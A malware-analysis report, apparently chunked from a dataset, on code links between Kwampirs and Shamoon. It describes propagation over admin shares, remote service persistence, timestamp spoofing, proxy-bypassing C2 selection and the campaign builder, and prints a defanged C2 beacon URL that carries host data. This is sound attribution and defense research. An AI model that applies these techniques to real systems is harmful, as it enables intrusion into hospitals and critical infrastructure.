1. Executive summary Cylera Labs researchers discovered, documented, and publicly presented our findings on the code similarities between the threat actor group “Orangeworm’’ and their ”Kwampirs’’ malware as compared to “Shamoon”, at the XIII STIC conference held in Madrid in December, 2019. Pablo Rincon Crespo, Cylera’s Vice President of Cybersecurity, and a researcher himself, led the presentation. Cylera was the first to present this linkage with code artifacts. Following the conference, during the first three months of 2020, the FBI released three Private Industry Notifications (PINs) in three consecutive months: January 6, February 5, and March 30, 2020. These PINs coincided with the escalation of tension between the United States and Iran, described heightened Kwampirs activity and also noted similarities with Shamoon. These PINs added that Kwampirs was being used against industrial control systems (ICS), aligning with the latest targets of Iranian APTs. In previous incidents, Shamoon was used against petrochemical companies like Saudi Aramco (August 2012), Rasgas (November 2012), and later Saudi Arabia Energy Sector, GACA and Central Bank (November 2016), Saipem (December 2018). US officials and security experts believe that Shamoon was first operated by an Iranian group known as the “Cutting Sword of Justice.” Shamoon is believed to be inspired by a malware that was first deployed against the Iranian oil industry (April 2012) and dubbed “Wiper” by its own authors.|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|b41912bda11346c392c145f3052725e0
"Orangeworm’s activity using Kwampirs malware is believed to have started as early as January 2015, and it had already infected hospitals and supply chains in 2018, as first reported by Symantec. The scope of the targeted attacks spanned healthcare and supply chains in more than 25 countries, across Asia, Europe, and the United States. With the FBI PINs information, Kwampirs also has been demonstrated against ICS in industries vital to everyday life.

EXECUTIVE SUMMARY

The linkage between Kwampirs and Shamoon

The technical research focused first on comparing Kwampirs code with multiple malware families, looking for shared code or coding similarities. During this initial investigation, the relationship to Shamoon was first identified and explored. Subsequently, we performed a comparative binary analysis of the malware artifacts of both families over time, which uncovered: The initial similarities between the two families Parallel updates between the two families and apparent bidirectional exchange between their creators A shared template-based system not previously recognized in either family"|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|0f7dedd51bf8487882ccbe377ad22f39
"The actors also used Kwampirs malware against medical equipment manufacturers and IT solution providers, as well as other supply chains globally. Symantec attributed the attacks to industrial espionage and did not find any indicator pointing to government-sponsored operators financing the attacks. However, after two further years of research, Cylera Labs assess with medium-high confidence that the threat actors developing Kwampirs are the same as Shamoon, suspected to be Iranian state-backed. This is a critical association for healthcare organizations and other industries around the world to understand.

The initial findings presented in 2019 made it unavoidable to consider the strong relation between Shamoon threat actors and the Orangeworm APT behind the healthcare attacks. However, our researchers endeavored to find additional evidence to help determine whether the similarities were due to the campaigns being the work of a single group or if the similarities were due to code reuse between separate groups, as a result of stolen, reverse engineered, shared, or repurposed source code.

Focus was also put on analysis of campaign infrastructure, which included extracting C2 servers from all the samples collected, and also mapping active C2 servers through mass scanning and DGA brute forcing. This mapping enabled the examination of C2 server contents, exploiting open directory listing vulnerabilities, and sinkholing multiple campaigns to learn more about victim distribution. Using infected system information gathered by sinkholing Kwampirs C2 domains, and Cylera’s knowledgebase of IoT & medical device characteristics, the researchers determined that infected machines likely included, among others, medical imaging machines from at least two prominent medical device manufacturers including CT, MRI, X-ray, and ultrasound machines, medication dispensing stations, clinical information kiosks, and laboratory information systems. The analysis has led Cylera researchers to conclude with high confidence that there is a connection between the Shamoon and Kwampirs actors, and also conclude with mediumhigh confidence that there was a single group responsible for both families and campaigns. Given the commonly accepted attribution of the Shamoon attacks to state-backed Iranian APT groups, the latter conclusion would imply that they were also responsible for Kwampirs."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|f7086496ec6646efbdf5a16966dfbf03
"If true, this would be the first publicly known case of a state-backed actor targeting healthcare supply chains and delivery organizations, a worrying extension of state actors’ traditional targeting of critical infrastructure of foreign adversaries. The full research report aims to detail Cylera’s initial findings, the relation between Kwampirs and Shamoon, and more importantly it discloses all the additional findings discovered since the initial presentation of December 2019. Attribution is a really complex task, but Cylera Labs concludes with high confidence that Kwampirs is linked to the Shamoon malware family and most likely, with medium-high confidence, to the same threat actors as the Shamoon 2 and 3 campaigns, which appear to be no different from Shamoon 1.

BACKGROUND

The linkage between Kwampirs and Shamoon

3. Background 3.1 About Kwampirs Kwampirs is a modular malware family with reconnaissance-focused functionality created by a group dubbed Orangeworm. The malware and group were first discovered by Symantec researchers and publicly disclosed in their April 2018 report, which discussed technical details and victimology but did not find any strong evidence of the group’s motivation or identity. Orangeworm has affected the healthcare sector through direct attacks against healthcare providers and attacks targeting the global healthcare supply chain. Machines infected with Kwampirs malware included medical devices in active use by affected healthcare providers, such as CT/MRI acquisition stations, the systems of the manufacturers that produce such devices, and systems of logistics organizations that deliver healthcare products. The campaigns have affected hospitals and companies in more than 27 countries, including the United States, India, Saudi Arabia, Philippines, Germany, Hungary, the United Kingdom, and Hong Kong, among others. Telemetry gathered by sinkholes setup by Cylera researchers have shown a heavy weight towards Saudi victims in at least some campaigns. New campaigns have typically emerged each year from 2015 to 2020, containing new lists of C2 servers and often assorted updates to the malware."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|18ee5e6777a5494f9b177f09f4cbb8c1
"FBI alerts in 2020 described heightened recent activity that has maintained healthcare as a target while expanding into other industries, including components of national critical infrastructure such as the energy sector. Orangeworm activity was first observed in January 2015, almost three years after the first Shamoon attack.

3.2 About Shamoon Shamoon, also known as DistTrack, is a highly destructive malware family used in cyber warfare operations since 2012, often against targets in the Middle East, with a focus on Saudi Arabia. The main targets have been in the Energy sector, particularly oil and gas, but more recent campaigns using Shamoon variants have been observed against a broader range of industries. Shamoon’s first campaign targeted Saudi Aramco in August 2012 and was said to be “the biggest hack in history” at the time, wiping more than 30,000 workstations and 2,000 servers and forcing the company to interrupt oil production. It could sound exaggerated, but given that they had to stop oil production for more than a month, economically speaking it is still one of the biggest. This attack has been publicly attributed to APT33 (aka Elfin), a group that was linked to the Iranian government by FireEye researchers in 2018, with the help of Magic Hound.

In February 2016, Frank J. Cilluffo, Director, McCrary Institute for Cyber & Critical Infrastructure Security, declared in the US House of Representatives that Iran and his proxy Cyber Hezbollah was linked to the Saudi Aramco and RasGas attacks. Leaked documents from US intelligence agencies from April 2013 also state that Iran was linked to the Shamoon 1 attacks. Updated versions of Shamoon have since emerged, Shamoon 2 in 2016 and Shamoon 3 in 2018. They have been observed in attacks against a variety of targets, including GACA and other Saudi Arabia organizations in late 2016 and Italian oil and gas contractor Saipem in December 2018, always with the same destructive end goal. Additional wiper malware families, such as Zerocleare and Dustman, that have since emerged are commonly believed to be related to Shamoon and created by the same actor. Multiple reports suggest that Shamoon 2 and 3 campaigns were executed by a set of Iranian APT groups. Reports about Shamoon 2 campaigns and Magic Hound/Shamoon, McAfee reports and Vectra reports mention that ISMDoor (a known malware family previously used by Iranian groups) was used to steal credentials. Later, the threat actors deployed Shamoon 2 malware from the hosts they accessed with the stolen credentials. The Magic Hound group is also linked by toolset with Greenbug, OilRig/APT34 and Rocket Kitten/APT35/NewsBeef by infrastructure overlap. Shamoon is also linked to APT33/Elfin/Refined Kitten by Kaspersky."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|0fb2cc55306940ce866bbbaa297dc913
Clearsky assesses with medium confidence that APT33 and APT34 have been collaborating since at least 2017 in their recent “Fox Kitten“ report. APT33 targeted a variety of sectors including petrochemical, financial, critical infrastructure aerospace, defense, aviation, and other critical infrastructures like healthcare, also in Saudi Arabia institutions, which is also seen in a handful of related Iranian APT groups (Operation Cleaver, MagicHound/APT35, and APT39/Chafer/Cadelle). Some of the members of these groups were exposed previously in multiple leaks (and http://t.me/lab_dookhtegan) and reports, suggesting a link between members participating in Shamoon and other wipers like StoneDrill, with the Kavosh Security Group and the Nasr Institute.|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|d2bc29f28ddd4f3580820152e2635cce
"3.3 About Cylera Labs research Pablo Rincon released Cylera Labs’ analysis and first findings of Kwampirs and its relation to Shamoon in December 2019 in a talk given at the XIII STIC conference held in Madrid (video, slides). Cylera researchers were cautious about attribution as they consider that even strong code similarities doesn’t imply the same developers. Code could have been stolen, reverse engineered, shared, or repurposed. Our researchers continued to meticulously analyze the evolution of both families to try to determine what had really happened. Beginning in January 2020, the FBI released a series of three advisories warning of usage of Kwampirs against supply chains and the healthcare industry, and warning of the potential ties to Shamoon, in three consecutive months: January 6, February 5, and March 30, 2020.

4. Scope This document will focus on the technical evidence that links Kwampirs, the malware used by Orangeworm, to the Shamoon malware family, as well as the relation of the threat actors using them. As an added challenge, there are samples of Shamoon that have been reverse engineered and open sourced by researchers, like open-Shamoon, that increase the difficulty of attribution. Cylera researchers analyzed a representative set of these samples and found multiple pieces of evidence that would invalidate the association of open-source versions to the focused sample set of this paper. The final sections of this document discuss the potential implications pertaining to attribution. This paper consists primarily of technical analysis of TTPs (Tools, Tactics and Procedures) observed in the Kwampirs and Shamoon campaigns, including strong similarities in code, toolset and structure, with additional discussion of auxiliary non-technical similarities at the end. During this investigation Cylera Labs has conducted the following main analysis milestones: meticulously gathered and analyzed Kwampirs and Shamoon malware artifacts publicly available"|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|5e864afb648f4f13bf95cda44ced3371
"Cylera researchers did not have contact with affected organizations and therefore did not conduct any form of forensic analysis or observe the full lifecycle of the Kwampirs attacks. The research outlined in this paper was performed strictly using public IOCs and OSINT. Cylera encourages entities affected by Orangeworm, as well as investigators, to contact Cylera for collaboration and assistance. The research entailed technical analysis of multiple Kwampirs and Shamoon samples, most of them downloaded from VirusTotal and Hybrid Analysis. If not specifically indicated, the referenced samples will correspond to the hashes listed in Table 1.

5. Analysis Sections

The two families share a similar general structure, though the structure itself is particularly unique. Kwampirs exhibits a simpler design, based on the number of components dropped relative to Shamoon. This is likely a reflection of the difference in intended purpose of the campaigns for each respective family.

5.1 Components overview Here is a walkthrough of the two families focusing on their similarities in key components and features. Like many malware families, Shamoon and Kwampirs each consist of a “dropper” that is responsible for dropping components hidden in the binary’s resources onto the target system. The resources dropped by each family are:

Shamoon

Kwampirs

A reporter component that communicates with the C2 to send system information and download new modules A wiper component that is carried with a driver

A reporter component that communicates with the C2 to send system information and download new modules, capable of working in 32-bit and 64-bit architectures."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|51c32582e8374c86a0549a4294302700
"Each family’s handling of the reporter component, which exists in some form within the resource container of each family, seems to exhibit general alignment in functionality but differences in specific implementation: Shamoon stores its reporter payload as named resource PKCS7 while Kwampirs stores its reporter payload as resource ID 101 Both use XOR-based encryption on the report payloads contained within their resource containers, a common and not particularly noteworthy technique Kwampirs further obfuscates the payload by hiding its reporter within a BMP file after a sequence of valid image rows at the beginning of the file, a technique that has been seen in other campaigns and families (such as certain Lazarus campaigns). A resulting image can be seen at Figure 2. Shamoon’s reporter component is an executable (.exe), while Kwampirs’ is a DLL

5.1.1 A walkthrough on the dropper differences In this section, some explanations about the general architecture differences and main execution flows of both families will be covered to understand how they differ between each other, and how the refactor -- or component reuse -- was probably done."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|31bbc15347174a209df52636f678cb46
"As an introduction, the two families share a common behavior involving a “std::basic_ streambuf” type containing what appears to be garbage strings of characters, maybe for breaking Antivirus patterns based on them. This behavior of adding garbage strings has been seen before in OilRig/APT34 campaigns (search “jgvchhctf” at this report). The strings do not appear to be truly randomly generated but instead look as if the author had smashed their keyboard almost without control. Both families include the familiar escape character sequences of “\r\n” that separate them into multiple lines. As a side effect, when both binaries are executed by a user, they will only see the output of these printed strings, as if the execution had failed because the file was somehow corrupted. Shamoon garbage string handling can be found in Figure 4.

Kwampirs garbage string handling can be seen in Figure 3.

ANALYSIS SECTIONS

The linkage between Kwampirs and Shamoon

When the droppers are executed they will print the garbage strings to the screen using “xsputn()” if certain conditions -- such as a comparison against the trigger date for Shamoon or if the target platform is supported as well as the OS version (in the case of Kwampirs) -- are satisfied. This may be done to make the user believe that the executable is broken. Assuming this purpose, it is somewhat interesting that the strings are different between the two families, but still seemingly generated in the same manner. So just keep in mind that Kwampirs main function contains these strange strings. Turns out this behavior has been present in many campaigns, including Shamoon and Kwampirs campaigns, and the place (the functions) where this code exists, seems to be a good reference for understanding how the “refactor” between the two families was performed This will be explained a bit later. Here is the walkthrough to reach Kwampirs “main” function inside Shamoons v1 dropper."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|9d937d02cf1a47c896998e706efe9b25
Some of these options may indicate that the binary was meant to be sometimes executed manually, i.e. with a list of main servers connected to other subnets that should be targeted first for fast propagation. In the case of the default execution path, the executable will start a persistence thread then execute an interruptible loop that checks the “final activation” date of Shamoon’s destructive payload (which is either the hardcoded Aug 15, 2012 date or a date extracted from the file modification time attribute of netft429.pnf).

In Kwampirs, the main entry point is at 0x00CE44C0 and looks like a mixture of the code Shamoon executes after the date check, with a few calls and checks of the parent calling functions.|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|c03073f3b3af4e63995c7f1d090f52ad
"In Shamoon the “main” function does three things: It begins by performing operations similar to those executed by the parent function in It fetches the reference time attributes of a legitimate Windows file It checks the architecture of the system It attempts to start the service If the architecture is 64-bits, it will drop the resource X509, the 64-bit version of the dropper, and update the service If the architecture is 32-bits, it will attempt to start the service by calling StartServiceControlDispatcher(). If this fails it issues an explicit call to the main function of the service and tweaks the service status and controls (0x00405B50) The main function of the service behaves differently based on the arguments used in the invocation of the binary. The general purpose of the function is to orchestrate how the persistence modules behave and what runmode is pretended for execution. Multiple calls can be issued to the same binary with different arguments to invoke different code paths or execution flows. It can: Run the persistence thread and spreader process Perform local host infection Run only the propagation module Try to infect a specific list of IP addresses

Shamoon, including: Retrieving the architecture of the system Retrieving of reference time attributes from legitimate Windows files It also contains additional functionality not seen in Shamoon such as a system version check and, most importantly, the decryption of the main configuration settings. Following these initial checks it will: Print the “garbage” strings, drop the hidden DLL payload from resource ID 101 Execute its main function along with the propagation and persistence mechanisms The DLL payload appears to be the replacement of the wiper component in Shamoon, PKCS12. This payload, whose original name is Actuator.dll and whose main callback function is MyDllMain, acts as an information gathering component. Similar to the higher-level function in Shamoon, this function will execute in different run modes depending on the number of arguments provided. A nice technical walkthrough of Kwampirs run modes was provided by the cybersecurity company Lab52 . Essentially this component will retrieve some basic information (network adapters information, native system information, and keyboard layout list) and then it will encrypt and submit it to a C2, while asking for new modules to download and execute. Cylera researchers have seen only one of these modules, and it consists of information gathering, mostly based on wmic commands (an evolved version of the one analyzed by Symantec, which was based only on windows binary shell commands).

The linkage between Kwampirs and Shamoon

The way the logic differs between both malware families indicates Shamoon has part of Kwampirs’ structure “embedded” in it, or simplified. This suggests the possibility that Kwampirs could have been developed first, and Shamoon was based on it, adding more logic and complexity, like wrapping it. At the same time it contrasts with the dates available on other reports, as Kwampirs’ first campaigns (at least publicly known) were first identified in early 2015. Nevertheless, exif and executable metadata indicates earlier compilation timestamps, some of them previous to Shamoon’s first campaign. Why is this important? Shamoon has been widely analyzed and there are a few publicly available reverse engineered source codes. This is a fact that goes against any attribution intent based on technical proof. However, on the other side, if Kwampirs was created before Shamoon, then the chances that it is the same group increases. Before Shamoon was discovered, no similar source code had been found. This would increase the probability that the authors are APT33, validating the attribution of Symantec about APT33 as the author of Shamoon (or that the authors shared the source code with APT33 somehow)."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|b2942e7aea3c4d729107977f2c06a76f
"However given the publicly available information and described dates, as well as our review of coevolution (check this section) the timeline says that Shamoon was first, then Kwampirs started to be used, and was followed by Shamoon versions 2 and 3, taking some of the improvements developed first in Kwampirs.

5.1.2 Timestamp Modifications Once the reporter files are dropped to disk, both Kwampirs and Shamoon alter their creation, modification, and access time attributes to mimic a legitimate Windows file, with Shamoon using “kernel32.dll” as the reference file and Kwampirs using “user32.dll.” This transmutation is additionally performed by each family after copying files to remote hosts during the infection process. Both families store the three reference timestamps (creation, modification, and last access) in global variables. Both droppers execute code to retrieve these reference dates and times from their respective reference files as one of the first steps of their “main” functions. Kwampirs performs the operation near the top of its “main” function, as displayed in Figure 5, after a few checks inside the function renamed as get_windows_dir_create_file_get_filetime() in IDA decompiled code.

5.1.3 Propagation Implementation The propagation modules in each sample consist of two main functions, one that generates IP addresses and one that attempts to infect each generated IP. There is a near one-to-one correspondence between the functionality and implementation of the two modules, excluding differences like step naming.

Address Generation The first function (neighbor propagation) iterates the list of network adapters in order to read and generate neighbor IP addresses based on the infected host’s address. These IPs are then passed to the second function, as well as the local file path, for self propagation. These similarities in implementation are clearly seen in the following reverse-engineered functions, which are almost identical except that the decompiler recognizes some loops as “while (condition) {}” and “for (...) {}” statements, and in the other family as “do {} while(condition)” statements, for iterating the network adapters and generating the last octets of the IPs to infect. Kwampirs can be seen in Figure 7, and Shamoon in Figure 8.

Some newer Kwampirs campaigns show improved functionality for the address generation. A separate thread is created, then it makes use of the API call GetTcpTable() (or GetExtendedTcpTable()) to extract the list of active TCP connections of the victim. Then, it will iterate over those results trying to infect each endpoint connected. It does this to spread over past local /24 ranges, through Windows peers (Figure 9).

1 When a call to the main propagation function is done, Kwampirs will first create and run concurrently a new separate thread. 2 In this new thread, the function GetTcpTable returns an array of Tcp connections. 3 Kwampirs will iterate the first 100 entries. 4 For each entry, it will check if ports 445 or 139 are in use (which means that they will also try to infect neighbor hosts using Windows protocols SMB or NetBios with the current victim). 5 Then it will call the infection function for those Windows-based hosts.

The second function is responsible for probing each generated IP address, checking for a set of possible Windows administrative shares, and infecting the host if possible. For each target IP it will iterate over a set of possible shares and attempt to read “\\[SHARE]\ window\system32\csrss.exe” for each. The target shares can be seen in the Figures 10 and 11 for Kwampirs and Shamoon respectively.

The linkage between Kwampirs and Shamoon

Minor Similarities There are numerous cases of small errors, bugs, or idiosyncrasies present in both families. For example: Both functions loop through the first 10 network adapters when finding the host’s local IP addresses in the IP generation function. This limit not only appears entirely arbitrary but also unnecessary as the API call used to retrieve the network adapters returns a NULL-terminated array that can be easily and safely iterated over in full."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|f3c9332fb1d945d49dc39f88550faef1
If a target share is accessible with sufficient permissions, each module will then check for the existence of a particular file and, if it is not present, create it. The purpose is twofold: one, determine if the machine is already infected, and two, test if we have permissions to write to the share. Kwampirs, for example, uses “ie11.png” as the target filename and will write 34 random bytes to it if not already present. If the module can proceed, it will then perform a self-copy to the destination host to a randomly generated temporary filename. In the case of Shamoon, the name to use as the first destination is a random name picked from a predefined set of command line tools. In the case of Kwampirs, it is a name starting with the prefix “wmiap” and some pseudo random choices. After the copying is done, in both of the cases the file is moved to a final destination path. Both modules will next change the creation, modification, and last access time attributes for the copied file, then enter a routine responsible for installing the transferred file as a remote service to ensure its execution. The service installation process will try to connect to the service manager of the victim host by using OpenSCManagerW(), and then it will try to open the services “WmiApSrvEx” (in case of Kwampirs) or “TrkSvr” (in Shamoon). If it does not exist, a new service is created, specifying the service name, display name, dependencies (RpcSs), among other parameters.|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|2645d0ed5e5a4ddda5ae225b2277a140
"In Shamoon, it will also add a scheduled task. After service creation, each module calls ChangeServiceConfig2W() to modify the service information and extended description. If successful, it will set the binary path name and then will connect to the remote registry (in Kwampirs, the remote registry service will be started first), then a key “\SYSTEM\CurrentControlSet\Services\SrvName” will be added to start the service on startup (were SrvName can be “TrkSvr” or “WmiApSrvEx”). The two functions vary a little bit. The Shamoon version does not enable the service of remote registry, but it does change the LanmanWorkstation dependencies adding Shamoon into it.

INDEX

When retrieving an interface’s IP address, each module checks that the string returned by net_ntoa() does not exceed 18 characters in length, which is the length of the CIDR representation of a subnet. The module does not use CIDR representations anywhere, making this check effectively incorrect (with the valid value being 15) and likely an artifact from code that the authors had borrowed from some reference; additionally, the proper way to perform this check would be to simply reference the h_addrtype field in the returned hostent struct."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|aee07d3c401240dabb8d0aba3201cb88
Minor Differences There are two main differences in the implementation of the two modules, both of which have been mentioned. First, Shamoon installs a scheduled job in addition to the service registration step shared by both. Second, the filename generation procedures use different logic and will output different sets of filenames. While Kwampirs follows some simple logical rules to pick and modify slightly the names, ending in a limited set of strings similar to “wmiapsvre.exe”, Shamoon picks a name randomly from an array of common Windows tool names, without any further modification. The generated name is just a pivoting name. After the transfer is done, they both move the copied dropper to a final fixed name (in other parts of the code, a copy to this generated path is also done). The fact that this name selection is done in the middle of this large function invites us to discard the idea that the propagation code could be just a simple third party library inclusion. This is also partially the reason why the basic blocks graph changes slightly. Also, the way the loops are handled appears to change from “while()” statements to “do{ } while()”, or “for(;;)”, which could be explained in multiple ways. First, that they just changed the code, second that Kwampirs’ base code is a reverse engineered and refactored version of Shamoon where wrong loop statements were inferred, and third, this might be also produced by the compiler optimizations.|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|d8578bbcdb5b446f8d52aab7fe76b24a
"The rest of the logic, in essence, is almost the same, and the service installation is pretty similar too, which will be explained a bit later.

5.1.4 C2 Communication

C2 Selection

The reporters of both Kwampirs and Shamoon contain functionality to upload host information and download additional payloads to execute from their C2s.

Kwampirs, contains two sets of 100 C2 URLs. Kwampirs will pick and try a URL at random from the first list (Figure 12), using Proxy Bypass information if present in its configuration, and iteratively test the subsequent URLs until an active C2 is found. If no active C2 is found within the first list it will rerun the same procedure on the second, this time ignoring any Proxy Bypass configuration and just using the host configuration. This strategy is their attempt to hide from the Proxy and content filtering solutions integrated with it, by default, when possible:

In general, the DLL that Kwampirs drops appears to be a complete refactor of the netinit.exe executable dropped by Shamoon. At the core, both modules use the same network API, both call InternetOpenW to create requests, and both handle the same general reporting-related tasks (ignoring anything wiper-related, which is only relevant to Shamoon.) However, the two have some differences in their implementations of these tasks."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|5d84817903674cbe87277e637f7c77ab
"Figure 12: Kwampirs C2 selection process, first call to report_data_to_c2 makes use of proxy and proxy bypass options, second try calls without proxy and proxy bypass options, defaulting as system settings.

INDEX

Shamoon 1 samples, on the other hand, use a single C2 identified by an IP address hardcoded in the binary. Interestingly, many Shamoon samples contained an internal IP address (within the 10.0.0.0/8 range specified by RFC1918) that initially led researchers to believe the attackers may have used a host on the targeted organization’s internal network as the C2. Later samples, however, used more obviously fake IP addresses (i.e. 1.1.1.1) that indicate that the C2 functionality was not meant to be used, and may be an artifact from a builder tool used by the attackers (as previously suggested by Unit42, a hypothesis that we will later review and confirm, at least, for Shamoon 2 and 3). While there are proxy and proxy bypass arrays, there is no fallback list, to ignore proxy options like in Kwampirs, and the C2 selection goes iteratively, one by one, without any random selection (Figure 13).

Host Information In Shamoon 1 (2012) there are pieces of code that suggest they might copy some of the files before destroying the hard drive. Before destroying anything, it will try to download an executable file from the C2 with the name “filer” which sounds like a custom tool for collecting and exfiltrating files, or maybe just encrypt what they were going to destroy just as an early ransomware tool). Apart from the aforementioned “Filer” functionality (which has been mentioned in previous research but no code samples have yet found or shared openly), the information gathered by Shamoon 1, using Windows API calls, to build the URLs submitted to the C2 is not much. On the other hand, Kwampirs issues more API calls and uses a custom packing format to embed this information inside the URLs to request. It is intriguing to note that Shamoon 2 and 3 feature the same information gathering and packing as Kwampirs rather than Shamoon 1, leading to further speculation about the evolutionary relationship between the families. Here is how Shamoon 1 reviews the host information and URL formats:

The URL related code with the different parameters can be seen in Figure 15.

Kwampirs and Shamoon 2 & 3 Kwampirs gathers and sends more host information inside the URL requests: the OS major version, OS minor version, platform, build, architecture, keyboard layout, and MAC addresses, among others. The data pivots in a temporary file (digirps.PNF). Then a base64 is generated and the URL is formatted. Here Kwampirs is compared with Shamoon 2, but keep in mind also that Shamoon 3 is almost identical to Shamoon 2. The data collected and the way it’s packed, encoded, and sent, is almost identical between Kwampirs and Shamoon 2: Fetching MAC Address in Kwampirs (Figure 16) is pretty similar, almost identical to Shamoon 2 (Figure 17).

The authors are just trying to hide from static analysis, but the algorithm is just a per-character value addition (or subtraction). The decrypted value will be used in a _vswprintf function call to format the final URL. This value corresponds to:

Figure 24: Kwampirs URL format string.

Figure 26: Shamoon 2 URL format string decrypted.

This is almost the same format as Kwampirs, but Shamoon 2 also has an array of paths, to append to the domain. While Kwampirs has been shown to take them already concatenated, it seems that Shamoon 2 improves on this. The parameter name, in this case, is ‘shinu’. In Kwampirs, it was just ‘q’. In Shamoon 3 and other samples, we’ve also seen the usage of the value ‘selection’ as the parameter name. hxxp://18.25.62[. ]70/groupgroup/default.php?q=[base64_string] Snippet 7: A Kwampirs URL"|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|7ff19c848510426d9b1fcadff599a41b
"Note also that Kwampirs and Shamoon 2 and 3 use only one parameter in the query string instead of 3 (both differing from Shamoon 1), and it changes considerably with respect to the collected data for building the URL. In Kwampirs, the parameter name is set to ‘q’ (in the samples we have seen) and the C2 (plus path to the script) is pseudo randomly picked, as explained before. Data is the host information collected in the aforementioned API calls (Figure 22), XOR-encrypted and customly packed and encoded in base64 both in Shamoon 2 and 3. In short, Kwampirs and Shamoon 2 and 3 retrieve the MAC address, system and version information, and keyboard layouts. Then it packs this information in the same binary structure and type, encodes this structure with base64, and builds the URL for the C2 with almost the same format (different values each, but same format) using nearly identical code.

C2 Requests Shamoon 1 uses InternetOpenW to send C2 requests (Figure 27). Shamoon creates an HTTP request containing the host information, unencrypted, and picks the hardcoded value of “you” as the HTTP User Agent."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|cf1498664b28459783627896eb629821
"Kwampirs uses the same network API, including the InternetOpenW call (Figure 28), to create requests.

The index at this point has been computed from the upper level function (calling function displayed at Figure 29) in Kwampirs, before the call to InternetOpenW. The difference is that Shamoon will always try to use the options, but Kwampirs introduces a change here. It will first try to use the options, and if all the requests to the C2s fail, it will try with a secondary list without using Proxy and ProxyByPass information."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|caa607c86f2e4c1587df5f52aacaf4b3

This module executes a series of commands to gather additional host information, which is subsequently uploaded to a C2 server. Interestingly, the commands are not identical to the analogous module examined in the initial Symantec report. These commands executed by this module are almost all wmic commands and are used to retrieve extensive information related to the computer, drivers, IRQs, baseboard, partitions, bios, logon, logical disks - a complete “radiography” of the system, displayed at Snippet 9.

Considering the level of detail found in the information gathered, it seems likely that the use of this module is intended for a reconnaissance phase. The types of information gathered may imply that the physical attributes of the device are of interest. This may imply that the ultimate goal of the campaign only relates to devices that satisfy particular physical properties that can be inferred from this information.

5.1.6 Rich Headers Rich Headers are an interesting indicator to consider. They include a list of the tools, by ID, collected by the linker to produce the binary and the number of “units” produced with each tool. Analysis of the headers reveals that the total units for Kwampirs is slightly lower than Shamoon, as expected since it has less functionality (see Figure 1) than Shamoon but is similar in proportion. Note also that the compilation tools and unit types are nearly identical between the two.

The Rich Headers of the droppers can be seen below (the only difference relating to LTCG → Link Time Code Generated) in Figure 34.

5.2 Common Template System Exposed (Builder) While typical Kwampirs droppers contain a single RT_BITMAP resource, which stores an obfuscated version of the reporter payload, our researchers uncovered some dropper samples containing two. In one case, the extra resource was a small artifact used to “pivot” privileged operations with the token of “explorer.exe” (similar to a small kind of mimikatz). But in some other cases, the extra resource stored under id “102”, appears to be a generic template DLL for the reporter module, accidentally included in the dropper. This indicates that the Kwampirs droppers were created using a Builder/Binder tool, responsible for rendering new campaign configurations."|data_input/Oilrig_reports/entry_df83e676-1d90-458a-b6ef-92a015e88561.text|6a94e40edf6a48bdb8cc57247b14c026
"When attackers want to start a new campaign, they use the builder. It renders a new DLL replacing these “tags” (placeholders) with the values corresponding to the new campaign. When this DLL is ready, the content is encrypted with an XOR-based algorithm and embedded into the dropper’s resources. Most of the information and code of the new campaign remains the same, as it is taken from the same template as older campaigns, except the C2 and communications configurations.

The template for the reporter module contains a series of configuration-related variables that are set to three-letter placeholder variable names in the form of “###VARNAME###” by default (Figures 36 and 37). The first letter seems to always be an ‘A’, but the second and third seem to be acronyms. The configuration parameters available for rendering include a primary C2 list, a secondary C2 list, the lengths of each list, and the lengths of the buffer containing each list, in addition to a handful of others, some of them being related to proxy configurations and bypass lists. Eleven unique variables have been identified in total. Our researchers believe there are similar templates for the droppers (similar placeholders were found in Shamoon 2 and 3 droppers, as explained later).

In newer campaigns, the dropper can remain the same, with almost the same DLL, just with different configuration values, without recompiling the code. This way, attackers review the metadata of templates once, making sure they do not leak pdb paths, computer names, artifacts and other handles or footprints. After this, production of new campaigns becomes more stable and safer, avoiding leaks (operating much the same as deployment tools, like Puppet templates). This can confuse researchers too as they might think that a DLL belongs to a known campaign when, in fact, it could have a totally different set of C2s. This is an indicator that there is a professionalization in the modus operandi of the authors. At the same time this modularization allows that the dropper could be used by other APT groups as false flag operations. If handled correctly, this modus operandi should help attackers -- except in cases where they leak the templates or placeholders, as these can become identifiable footprints that can lead to discovery (see attribution section below).

On the other hand, the fact that a resource 102 was found with the “unrendered” template suggests that this binding was performed by someone that was not familiarized with the building process and added it by mistake (Ops problem now..). On the other hand Shamoon contains more components to bind to the resources.

We’ve seen other versions of the DLL, changing the way the C2 lists are stored (some encrypted, others not), but indicating that there has been an evolution of the droppers and the payloads. Our researchers believe most of the compilation timestamps are clearly fake (like 2003, using Visual Studio 2010). Others could be real, but this would mean there was a Kwampirs previous to the Aramco attack, which could be possible. But given the publicly known dates of Kwampirs detections, it seems unlikely.

5.3 Kwampirs C2 Infrastructure Cylera researchers paid careful attention to the C2 infrastructure used by active Kwampirs campaigns throughout the course of this research. Of the assets monitored, one domain used during campaigns around November 2018 attracted particular attention.

